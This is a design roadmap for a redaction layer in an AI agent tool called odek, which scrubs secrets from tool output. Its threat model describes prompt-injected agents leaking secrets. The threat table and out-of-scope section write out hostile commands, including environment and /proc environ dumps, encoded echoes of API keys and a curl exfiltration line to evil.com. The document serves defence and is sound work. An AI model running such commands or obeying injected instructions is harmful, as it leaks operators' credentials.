# Redaction Hardening Plan

Status: in progress. The first increment (known-value redaction + Telegram
token pattern) ships in `internal/redact`. This document is the roadmap for
making the redaction layer robust against the full set of known attacks on
**the tools surface**, and an honest statement of what redaction can and
cannot defend.

---

## Scope and why

odek's redaction layer (`internal/redact`) sanitises **tool output** before it
is appended to the conversation and persisted to the session
(`internal/loop/loop.go`, `internal/session/session.go`). It exists so that a
secret which surfaces in a command's output — accidentally or because a
prompt-injected agent went looking for it — does not end up in the transcript,
the session file, the model provider's logs, or a Telegram chat.

The surface we harden is deliberately narrow: **what tools return to the
agent.** We do *not* try to scrub odek's own process environment, because the
agent process legitimately needs its secrets — above all the LLM API key it
uses to talk to the model. Removing the key from the process is not an option;
keeping it from *leaking back out through tool output* is. That makes the
redaction layer the right control, and it must be as close to airtight as a
lexical filter can be.

## Threat model (tools surface)

An attacker who has achieved prompt injection drives the agent to disclose a
secret it can read, by routing it through tool output that returns to the
transcript. Concretely:

| # | Vector | Example | Pre-fix status |
|---|--------|---------|----------------|
| 1 | Env dump of well-named, standard-format key | `env`, `printenv` | Caught (format + name patterns) |
| 2 | Bare echo of a non-standard-format secret | `echo $TELEGRAM_BOT_TOKEN` | **Leaked** |
| 3 | Encoded secret | `echo $API_KEY \| base64`, `\| xxd`, `\| rev` | **Leaked** |
| 4 | `/proc` environ dump | `cat /proc/self/environ` | Partially (NUL-delimited, name pattern needs `NAME=`) |
| 5 | Secret read from a file | `cat ~/.config/odek/secrets.env` | Depends on format |
| 6 | Secret embedded in a longer string | `curl -H "x: $TOKEN" ...` echoed back in verbose output | Depends on format |

Vectors 2–4 are the gaps this work closes.

## Out of scope for redaction (documented limits)

These are **not** solvable by a lexical filter and must be defended elsewhere
(network-egress controls, approval gating, `non_interactive: deny`):

- **Arbitrary transformation** — `gzip`, `openssl enc`, gpg, custom character
  substitution, chunking a secret across multiple commands. We precompute the
  *common* encodings (base64, hex, url, reversed); we cannot enumerate all of
  them.
- **Side-channel exfiltration** — `curl -d "$TOKEN" evil.com`, a reverse
  shell, DNS tunnelling. The secret never returns to the tool surface, so
  redaction never sees it. This is the job of the egress denylist and
  `network_egress: prompt` + `non_interactive: deny` in the danger config.

Redaction is a **safety net against disclosure into the transcript**, not a
guarantee against a determined exfiltration attempt. Defense in depth: pair it
with the egress controls.

---

## Design

Two cooperating layers run inside `RedactSecrets`:

### Layer 1 — Known-value redaction (new)

odek knows its own secrets. We register them at startup and redact the exact
values — plus their common encodings — wherever they appear, regardless of
format. This closes vectors 2, 3, and 4 for odek's own secrets.

- `RegisterSecret(value)` — records a value and its encodings: base64
  (std/raw/url), hex (upper/lower), percent-encoding, reversed.
- `RegisterSecretsFromEnv()` — registers values of env vars whose name has a
  secret-bearing segment (`KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `PASS`,
  `CREDENTIAL`, …), matched on whole `_`/`-` segments so `GIT_AUTHOR_NAME`
  (AUTHOR) and `compass` (PASS) are *not* treated as secrets.
- Seeded once in `config.LoadConfig` from the resolved API key, the Telegram
  bot token, and the environment; and in the subagent path for the
  FD-supplied key.
- Values shorter than `minSecretLen` (8) are ignored to avoid over-redacting
  ordinary text. Matching is literal (a `strings.Replacer`), so no regex
  metacharacter or ReDoS risk from arbitrary secret contents.

### Layer 2 — Format patterns (existing, extended)

Regex patterns for secrets we *don't* hold but recognise by shape (a
customer's AWS key in a file, a GitHub PAT, a private key). Extended here with
a **Telegram bot token** pattern (`<bot-id>:<35-char>`), which has no `name=`
context for the generic rule to catch.

## Implemented in this PR

- `internal/redact/redact.go`: known-value registry (`RegisterSecret`,
  `RegisterSecretsFromEnv`, `ResetSecrets`), encoding-aware literal matching,
  wired into `RedactSecrets` / `HasSecrets` / `CountSecrets`; Telegram
  bot-token pattern.
- `internal/config/loader.go`: seed the registry at startup.
- `cmd/odek/subagent.go`: register the FD-supplied API key.
- `internal/redact/known_value_test.go`: coverage for vectors 2–4, env-scan
  selectivity, and the short-value guard.

## Follow-ups (not in this PR)

1. **Streaming redaction across chunk boundaries.** A secret split across two
   streamed tool-output chunks evades per-chunk redaction. Buffer a sliding
   window equal to the longest registered form.
2. **Entropy heuristic for unknown secrets.** Flag high-entropy tokens of
   secret-like length that match no pattern and no known value, to catch
   third-party secrets read from files (vector 5) — tuned to avoid hashes/UUIDs.
3. **Redaction telemetry.** Count redaction hits per session and surface a
   warning when tool output contained secrets, so operators notice exfil
   attempts rather than silently dropping them.
4. **Argument/echo-back coverage (vector 6).** Consider redacting tool *inputs*
   (command strings) that embed a known value, not just outputs.
5. **Periodic re-seed.** If secrets can rotate at runtime, re-run
   `RegisterSecretsFromEnv` on reload.

## Testing

`go test ./internal/redact/` covers each closed vector. New tests:
`TestTelegramBotTokenPattern`, `TestKnownValue_BareEcho`,
`TestKnownValue_Encodings`, `TestKnownValue_ProcEnvironDump`,
`TestRegisterSecretsFromEnv`, `TestRegisterSecret_TooShortIgnored`.
